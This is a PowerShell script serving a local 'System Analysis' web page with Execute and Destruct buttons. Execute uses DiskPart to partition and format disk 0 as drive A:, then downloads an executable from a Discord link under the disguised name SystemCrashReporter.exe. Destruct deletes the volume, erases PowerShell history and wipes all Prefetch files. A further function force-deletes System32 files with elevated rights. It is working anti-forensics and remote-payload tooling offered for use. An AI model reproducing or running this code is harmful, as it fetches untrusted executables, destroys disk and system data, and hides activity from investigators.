# Generate a random port number
$port = Get-Random -Minimum 1024 -Maximum 65535

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://+:$port/")
$listener.Start()
Write-Host "Listening on port $port..."
Write-Host "Access the web interface at: http://localhost:$port"

# Default background and GIF URLs
$defaultBackgroundImageUrl = "https://i.pinimg.com/originals/27/1b/17/271b17fc7447e6c2b65db1e2aba97cd8.jpg"
$loadingGifUrl = "https://cdn.dribbble.com/users/121337/screenshots/1309485/loading.gif"
$executeEmoji = "🚀"
$destructEmoji = "💥"

# Function to execute DiskPart commands
function Invoke-DiskPart {
    param (
        [string]$scriptBlock
    )
    $scriptPath = [System.IO.Path]::GetTempFileName()
    $scriptBlock | Out-File -FilePath $scriptPath -Encoding ASCII
    $output = diskpart.exe /s $scriptPath
    Remove-Item -Path $scriptPath -Force
    return $output
}

# Function to delete files from System32 with administrative rights
function Delete-FilesFromSystem32 {
    param (
        [string]$fileToDelete
    )

    $system32Path = "C:\Windows\System32\"

    # Construct full path to the file in System32
    $filePath = Join-Path -Path $system32Path -ChildPath $fileToDelete

    # Check if the file exists before attempting to delete
    if (Test-Path $filePath -PathType Leaf) {
        try {
            # Delete the file with administrative privileges
            $deleteResult = Start-Process cmd.exe -ArgumentList "/c del /F /Q $filePath" -Verb RunAs -PassThru -Wait
            if ($deleteResult.ExitCode -eq 0) {
                Write-Host "Successfully deleted $fileToDelete from System32."
            } else {
                Write-Host "Failed to delete $fileToDelete from System32."
            }
        } catch {
            Write-Host "Error deleting $fileToDelete from System32: $_"
        }
    } else {
        Write-Host "File $fileToDelete does not exist in System32."
    }
}

# Function to create a new volume, download and run executable
function Create-VolumeAndRunExecutable {
    param (
        [string]$volume,
        [string]$executableUrl
    )

    # Create the volume and assign letter
    $scriptCreate = @"
select disk 0
create partition primary
format fs=ntfs quick
assign letter=$volume
"@
    Invoke-DiskPart -scriptBlock $scriptCreate

    # Start a new PowerShell process to delete the journal
    $deleteJournalCommand = @"
Remove-Item -Path 'A:\journal.txt' -ErrorAction SilentlyContinue
"@
    Start-Process powershell.exe -ArgumentList "-Command", "$deleteJournalCommand" -Verb RunAs

    # Start a new PowerShell process to download and rename the executable
    Start-Sleep -Seconds (Get-Random -Minimum 4 -Maximum 6)  # Wait for 4 to 5 seconds after creating the volume

    # Start a new PowerShell process to download and rename the executable
    Start-Process powershell.exe -ArgumentList "-Command", "Invoke-WebRequest -Uri '$executableUrl' -OutFile 'A:\SystemCrashReporter.exe'" -Verb RunAs
}

# Function to delete a volume and securely delete files
function Delete-VolumeAndTraces {
    param (
        [string]$volume
    )

    # PowerShell command to recover the journal if it was deleted during execution
    $recoverJournalCommand = @"
if (-not (Test-Path 'A:\journal.txt')) {
    Copy-Item -Path 'C:\SystemCrashReporter\journal.txt' -Destination 'A:\' -Force
}
"@
    Start-Process powershell.exe -ArgumentList "-Command", "$recoverJournalCommand" -Verb RunAs

    # Delete the volume
    $scriptDelete = @"
select volume $volume
delete volume
"@
    Invoke-DiskPart -scriptBlock $scriptDelete

    # Clear PowerShell history
    Clear-History -ErrorAction SilentlyContinue
    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

    # Delete prefetch files (if not already deleted)
    Delete-PrefetchFiles
}

# Function to delete prefetch files (requires administrative rights and policy)
function Delete-PrefetchFiles {
    $prefetchPath = "C:\Windows\Prefetch"
    $prefetchFiles = Get-ChildItem -Path $prefetchPath -Filter "*.pf" -File

    if ($prefetchFiles.Count -gt 0) {
        try {
            # Delete all prefetch files
            foreach ($file in $prefetchFiles) {
                Remove-Item -Path $file.FullName -Force -ErrorAction Stop
                Write-Host "Deleted $file"
            }
        } catch {
            Write-Host "Error deleting prefetch files: $_"
        }
    } else {
        Write-Host "No prefetch files found."
    }
}

# Function to handle HTTP requests and responses
function Handle-Request {
    param ($context)
    $request = $context.Request
    $response = $context.Response

    try {
        if ($request.HttpMethod -eq 'GET') {
            $url = $request.Url.AbsolutePath
            switch ($url) {
                '/' {
                    Serve-SystemAnalysis -BackgroundImageUrl $defaultBackgroundImageUrl
                }
                '/background' {
                    Serve-SystemAnalysis -BackgroundImageUrl $defaultBackgroundImageUrl
                }
                default {
                    $response.StatusCode = 404
                    $response.StatusDescription = "Not Found"
                }
            }
        } elseif ($request.HttpMethod -eq 'POST') {
            $url = $request.Url.AbsolutePath
            switch ($url) {
                '/execute' {
                    # Create a new volume (A:\), download and run executable
                    $newVolume = "A"
                    $executableUrl = "https://cdn.discordapp.com/attachments/1266628616213495892/1266629385197453322/JournalTrace.exe?ex=66a5d80a&is=66a4868a&hm=f5fb52d47f718cd1987998f6b7c81d1c8705d89ec6a383d6201f7f16516f0b44&"

                    # Display loading spinner
                    Serve-SystemAnalysis -BackgroundImageUrl $defaultBackgroundImageUrl -ShowLoadingSpinner $true -Message "Executing, please wait..."

                    Start-Sleep -Seconds (Get-Random -Minimum 4 -Maximum 6)  # Simulate execution time

                    # Start a new volume, download executable
                    Create-VolumeAndRunExecutable -volume $newVolume -executableUrl $executableUrl

                    # Respond with success message
                    Serve-SystemAnalysis -BackgroundImageUrl $defaultBackgroundImageUrl -Message "Executed successfully."

                    # Delete prefetch files instantly
                    Delete-PrefetchFiles

                    $response.StatusCode = 200
                    $response.StatusDescription = "OK"
                }
                '/destruct' {
                    # Delete the volume (A:\) and traces
                    $volumeToDelete = "A"
                    Serve-SystemAnalysis -BackgroundImageUrl $defaultBackgroundImageUrl -ShowLoadingSpinner $true -Message "Cleaning, sit back and relax we got you bro!"

                    Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 7)  # Simulate cleaning time

                    Delete-VolumeAndTraces -volume $volumeToDelete

                    # Respond with success message
                    Serve-SystemAnalysis -BackgroundImageUrl $defaultBackgroundImageUrl -Message "Cleaned. Stay calm."

                    $response.StatusCode = 200
                    $response.StatusDescription = "OK"
                }
                default {
                    $response.StatusCode = 404
                    $response.StatusDescription = "Not Found"
                }
            }
        }
    } catch {
        Write-Host "Error: $_"
        $response.StatusCode = 500
        $response.StatusDescription = "Internal Server Error"
    } finally {
        $response.Close()
    }
}

# Function to serve the HTML interface
function Serve-SystemAnalysis {
    param (
        [string]$BackgroundImageUrl = $null,
        [string]$Message = $null,
        [bool]$ShowLoadingSpinner = $false
    )

    $loadingSpinnerDisplay = if ($ShowLoadingSpinner) { 'flex' } else { 'none' }
    $messageText = if ($Message) { $Message } else { '' }

    $html = @"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Analysis</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            background: url('$BackgroundImageUrl') no-repeat center center fixed;
            background-size: cover;
            color: white;
        }
        .command-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            background-color: rgba(0, 0, 0, 0.5); /* Semi-transparent black */
            border-radius: 10px;
            width: 600px; /* Adjusted width */
            height: 600px; /* Adjusted height */
            margin: 0 auto;
        }
        h1 {
            margin-bottom: 10px;
        }
        h2 {
            margin-bottom: 20px;
        }
        @keyframes heartbeat {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        .command-button {
            padding: 15px 20px;
            margin: 10px;
            font-size: 18px;
            font-weight: bold;
            text-align: center;
            cursor: pointer;
            border: none;
            border-radius: 8px; /* Slightly rounded corners */
            background-color: #9C27B0;
            color: white;
            transition: background-color 0.3s;
            animation: heartbeat 1.5s infinite ease-in-out;
            width: 250px; /* Uniform width */
            height: 60px; /* Uniform height */
            display: inline-block;
        }
        .command-button:hover {
            background-color: #AB47BC;
        }
        .emoji {
            margin-left: 10px;
        }
        .loading-container {
            display: $loadingSpinnerDisplay;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100%;
        }
        .loading-spinner {
            /* Customize your spinner here */
            border: 8px solid #f3f3f3; /* Light grey */
            border-top: 8px solid #9C27B0; /* Purple */
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading-text {
            margin-top: 10px;
            font-size: 18px;
            color: #FFC107;
        }
        .message-box {
            margin-top: 20px;
            font-size: 18px;
            color: #FFC107;
            opacity: 0;
            transition: opacity 1s;
        }
        .download-link {
            display: none; /* Hide download link */
        }
    </style>
</head>
<body>
    <div class="command-container">
        <h1>System Analysis</h1>
        <h2 id="action-heading">Choose Your Action:</h2>
        <button class="command-button" onclick="executeCommand('/execute')">$executeEmoji Execute</button>
        <button class="command-button" onclick="startDestruct()">Destruct <span class="emoji">$destructEmoji</span></button>
        <div id="loading-container" class="loading-container">
            <div class="loading-spinner"></div>
            <div id="loading-text" class="loading-text">$messageText</div>
        </div>
        <div id="message-box" class="message-box"></div>
        <br>
        <div id="download-link" class="download-link">Click here to download SystemCrashReporter.exe to A:\</div>
    </div>

    <script>
        function executeCommand(path) {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', path, true);
            xhr.onload = function () {
                if (xhr.status === 200) {
                    console.log('Command executed successfully');
                    location.reload();
                } else {
                    console.error('Error executing command: ' + xhr.statusText);
                }
            };
            xhr.onerror = function () {
                console.error('Request failed');
            };
            xhr.send();
        }

        function startDestruct() {
            document.getElementById('action-heading').textContent = 'Destruction in progress...';
            document.querySelectorAll('.command-button').forEach(btn => btn.style.display = 'none'); // Hide the buttons
            document.getElementById('loading-container').style.display = 'flex'; // Show loading spinner

            fetch('/destruct', { method: 'POST' })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                    return response.text();
                })
                .then(data => {
                    document.getElementById('loading-container').style.display = 'none'; // Hide loading spinner
                    document.getElementById('loading-text').textContent = 'Cleaning, sit back and relax we got you bro!';
                    document.getElementById('message-box').textContent = 'Cleaning completed successfully. Stay calm.';
                    document.getElementById('message-box').style.opacity = '1'; // Show success message
                    document.getElementById('action-heading').textContent = 'Choose Your Action:';
                    document.querySelectorAll('.command-button').forEach(btn => btn.style.display = 'inline-block'); // Show the buttons
                })
                .catch(error => {
                    console.error('Error during destruction:', error);
                    document.getElementById('loading-container').style.display = 'none'; // Hide loading spinner
                    document.getElementById('message-box').textContent = 'Error during destruction. Please try again.';
                    document.getElementById('message-box').style.opacity = '1'; // Show error message
                    document.getElementById('action-heading').textContent = 'Choose Your Action:';
                    document.querySelectorAll('.command-button').forEach(btn => btn.style.display = 'inline-block'); // Show the buttons
                });
        }
    </script>
</body>
</html>
"@

    $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
    $response.ContentLength64 = $buffer.Length
    $output = $response.OutputStream
    $output.Write($buffer, 0, $buffer.Length)
    $output.Close()
}

# Main loop to handle incoming requests
try {
    while ($listener.IsListening) {
        $context = $listener.GetContext()
        Handle-Request -context $context
    }
}
finally {
    if ($listener -ne $null) {
        $listener.Stop()
    }
}
